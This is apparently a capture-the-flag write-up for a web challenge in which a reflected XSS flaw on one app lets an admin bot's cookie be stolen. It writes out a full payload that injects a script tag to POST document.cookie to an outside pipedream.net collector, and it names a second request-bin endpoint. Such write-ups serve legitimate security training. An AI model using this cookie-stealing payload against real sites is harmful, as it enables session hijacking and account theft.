---
layout: post
title:  "server challenge aresx"
image: /assets/img/aresx.png
date:   2022-08-29 21:52:19
tags:
- web
description: The challenge has two separate webpages one which is vulnerable to xss attacks and from which we must steal a cookie, and another where we can send links to be opened
categories:
- web
---

The challenge has two separate webpages one which is vulnerable to xss attacks and from which we must steal a cookie, and another where we can send links to be opened:
![](/assets/img/2022-08-11-11-18-01.png)
Figure 1 The first app


![](/assets/img/2022-08-11-11-18-14.png)
Figure 2 Second app
The input to be opened by it is : 
http://vanilla.hub/?name=<script>fetch('https://enzvin6fpk7xtu0.m.pipedream.net', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>


https://enqmimydnbiuecc.m.pipedream.net
For the purpose of this challenge request.bin

 ![](2022-08-11-11-18-26.png)
Figure 3 this is the stolen cookie
 ![](2022-08-11-11-18-35.png)
Figure 4 Vulnerable code in the application

 ![](2022-08-11-11-18-43.png)
Figure 5 Docker config hostname
Because the get request to the 3002 app will echo it to the page Reflected XSS is possible.  The bot on 3003 will open our request with the xss and we steal the cookie and then boom we’re done.
